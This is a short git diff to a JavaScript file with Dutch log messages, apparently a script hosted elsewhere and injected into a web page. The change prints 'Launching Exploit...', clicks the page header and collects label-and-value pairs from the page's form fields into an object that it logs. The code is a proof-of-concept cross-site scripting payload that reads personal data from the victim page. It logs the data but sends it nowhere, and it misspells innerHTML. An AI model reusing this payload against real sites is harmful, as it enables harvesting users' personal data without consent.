@@ -2,8 +2,21 @@ function main_func(){
   console.log("Hallo vanaf een js programma gehost van het internet");
   console.log("Dit is mijn origin: "+window.origin);
   console.log("Dit is mijn domain: "+document.domain);
-  console.log("Kijken of ik de pagina ook aan kan passen..")
-  const name_el = document.getElementsByClassName("header")?.[0]?.innerHTML;
-  console.log("Name found:", name_el);
+  console.log("\nLaunching Exploit...")
+  const name_el = document.getElementsByClassName("header")?.[0];
+  console.log("Name", name_el.innerHtml);
+  setTimeout(()=>{
+    const els = Array.prototype.slice.call(document.getElementsByClassName("twopartfields"));
+    const data = {}
+    for (let i = 0; i < els.length; i+=2){
+      const label = els[i].innerHtml;
+      const info = els[i+1].querySelector('span').innerHtml;
+      data[label] = info;
+      console.log(data);
+    }
+  },500)
+  name_el.click()
+  
+  
 }
 main_func()
